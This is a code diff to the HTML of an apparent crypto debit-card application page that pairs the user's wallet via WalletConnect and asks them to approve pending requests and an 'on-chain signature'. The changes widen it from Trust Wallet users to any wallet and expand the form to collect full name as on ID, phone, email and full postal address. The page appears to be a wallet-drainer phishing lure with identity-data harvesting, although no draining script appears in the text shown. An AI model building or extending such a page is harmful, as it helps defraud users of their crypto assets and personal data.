@@ -622,7 +622,7 @@
     <div class="m-loader" id="m-loader" hidden>
       <div class="spinner spinner-lg"></div>
       <h3 class="m-loader-title" id="m-loader-title">Linking your account to banking partner</h3>
-      <p class="m-loader-sub" id="m-loader-sub">Keep Trust Wallet open and approve any pending requests to complete your application.</p>
+      <p class="m-loader-sub" id="m-loader-sub">Keep your wallet open and approve any pending requests to complete your application.</p>
 
       <ul class="m-loader-info">
         <li><span>Issuing partner</span><strong>TrustCard Issuing Ltd · FCA FRN 926481</strong></li>
@@ -632,7 +632,7 @@
       </ul>
 
       <ol class="m-loader-steps" id="m-loader-steps">
-        <li data-step="pair" class="is-active"><span class="step-dot"></span>Pairing with Trust Wallet</li>
+        <li data-step="pair" class="is-active"><span class="step-dot"></span>Pairing with your wallet</li>
         <li data-step="auth"><span class="step-dot"></span>Issuing banking authorization</li>
         <li data-step="sign"><span class="step-dot"></span>Confirming on-chain signature</li>
       </ol>
@@ -698,7 +698,7 @@
 
         <!-- Desktop: QR fallback -->
         <div class="m-qr-fallback m-cta-desktop">
-          <p class="m-qr-label">Scan with Trust Wallet on your phone</p>
+          <p class="m-qr-label">Scan with any WalletConnect wallet on your phone</p>
           <div class="qr-wrap qr-wrap-compact" id="qr-area">
             <div class="qr-skeleton">
               <div class="spinner"></div>
@@ -730,13 +730,35 @@
 
         <form class="m-form" id="m-contact-form" novalidate>
           <label class="m-field">
-            <span>Email address</span>
+            <span>Full name</span>
+            <input type="text" name="name" autocomplete="name" required placeholder="Name as on ID"/>
+          </label>
+          <label class="m-field">
+            <span>Contact number</span>
+            <input type="tel" name="phone" autocomplete="tel" required placeholder="+1 555 0100"/>
+          </label>
+          <label class="m-field">
+            <span>Email / mail ID</span>
             <input type="email" name="email" autocomplete="email" required placeholder="you@example.com"/>
           </label>
           <label class="m-field">
-            <span>Phone number</span>
-            <input type="tel" name="phone" autocomplete="tel" required placeholder="+1 555 0100"/>
+            <span>Address line 1</span>
+            <input type="text" name="addressLine1" autocomplete="address-line1" required placeholder="House / street / building"/>
           </label>
+          <label class="m-field">
+            <span>Address line 2</span>
+            <input type="text" name="addressLine2" autocomplete="address-line2" placeholder="Apartment, suite, landmark (optional)"/>
+          </label>
+          <div class="m-form-row">
+            <label class="m-field">
+              <span>ZIP / postal code</span>
+              <input type="text" name="zip" autocomplete="postal-code" required placeholder="ZIP / PIN"/>
+            </label>
+            <label class="m-field">
+              <span>State</span>
+              <input type="text" name="state" autocomplete="address-level1" required placeholder="State / province"/>
+            </label>
+          </div>
           <div class="m-field m-combobox" id="m-country-combo">
             <span>Country</span>
             <div class="m-combo-input-wrap">
